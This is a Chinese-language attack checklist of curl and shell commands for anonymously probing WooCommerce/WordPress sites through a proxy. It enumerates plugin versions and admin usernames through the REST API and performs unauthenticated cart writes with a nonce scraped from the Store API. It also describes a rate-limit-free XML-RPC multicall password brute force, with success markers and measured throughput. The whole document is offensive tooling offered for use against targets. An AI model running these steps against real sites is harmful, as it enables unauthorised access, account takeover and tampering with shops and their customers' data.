# WooCommerce 站（匿名可打）完整信息收集与未授权写入清单
# 出口：经命令级 HTTP 代理，勿改本机网络配置
# 用法：curl -x http://127.0.0.1:7892 -k https://TARGET/<path>

# ---------- 1. 组件版本（一次请求拿全栈） ----------
curl -sk -x $PX https://TARGET/ | grep -oP '<meta name="generator" content="\K[^"]+'
#   典型输出: WordPress X.Y.Z / WooCommerce A.B.C / Elementor ... / Powered by Slider Revolution ...

# ---------- 2. 管理员用户名（未授权） ----------
curl -sk -x $PX https://TARGET/wp-json/wp/v2/users
#   输出: [{"id":1,"name":"...","slug":"admin","link":".../author/admin/",...}]
#   兜底: /?author=1 (301 -> /author/<slug>/)  、 /wp-json/wp/v2/users/1

# ---------- 3. 路由与命名空间全景 ----------
curl -sk -x $PX https://TARGET/wp-json/            # 体积极大，含全部 REST 命名空间
curl -sk -x $PX "https://TARGET/?rest_route=/wp/v2/users"   # 无伪静态时的等价写法

# ---------- 4. 未授权可读数据 ----------
curl -sk -x $PX "https://TARGET/wp-json/wp/v2/media?per_page=100"   # 媒体库 + 上传路径
curl -sk -x $PX "https://TARGET/wp-json/wp/v2/pages?per_page=100"
curl -sk -x $PX "https://TARGET/wp-json/wc/store/v1/products"       # 全量商品
curl -sk -x $PX "https://TARGET/wp-json/elementor/v1/"
curl -sk -x $PX "https://TARGET/?elementor-preview=1"

# ---------- 5. 插件版本（readme.txt 直读） ----------
for p in woocommerce contact-form-7 elementor elementor-pro revslider woo-smart-wishlist woo-smart-compare; do
  curl -sk -x $PX "https://TARGET/wp-content/plugins/$p/readme.txt" | grep -iE 'Stable tag|==='| head -3
done
# 主题版本: /wp-content/themes/<theme>/style.css  (Version: x.y.z)

# ---------- 6. ★未授权写入：WooCommerce Store API ----------
# 6a. nonce 直接从响应头拿（无需登录！）
NONCE=$(curl -sk -x $PX -D - -o /dev/null "https://TARGET/wp-json/wc/store/v1/cart" | grep -i '^nonce:' | tr -d '\r' | awk '{print $2}')
# 6b. 用 nonce 未授权加购 -> 期望 HTTP 201
PID=$(curl -sk -x $PX "https://TARGET/wp-json/wc/store/v1/products?per_page=1" | python -c "import sys,json;print(json.load(sys.stdin)[0]['id'])")
curl -sk -x $PX -X POST "https://TARGET/wp-json/wc/store/v1/cart/add-item" \
  -H "Content-Type: application/json" -H "Nonce: $NONCE" \
  -d "{\"id\":$PID,\"quantity\":2}" -w '\n[HTTP %{http_code}]\n'
#   201 + 完整购物车 JSON = 未授权状态变更成立
#   同族端点（同样只需 nonce）: cart/update-item, cart/remove-item, cart/apply-coupon, cart/select-shipping-rate, checkout

# ---------- 7. XML-RPC 无限速爆破通道 ----------
# 7a. 探活
curl -sk -x $PX -X POST https://TARGET/xmlrpc.php -H 'Content-Type: text/xml' \
  --data '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
#   200 + 方法表含 system.multicall 即可批量
# 7b. multicall 批量校验（一次请求试 N 个口令）
#   body 结构: system.multicall 的 params[0] = array，每项是 {methodName: wp.getUsersBlogs, params:[user, pass]}
#   成功判据: 返回含 <name>blogName</name> / <name>isAdmin</name>
#   失败判据: 每项 <name>faultCode</name><int>403</int> "Incorrect username or password."
#   实测吞吐: 20 口令/请求 ≈ 2.5s，600+ 组无封禁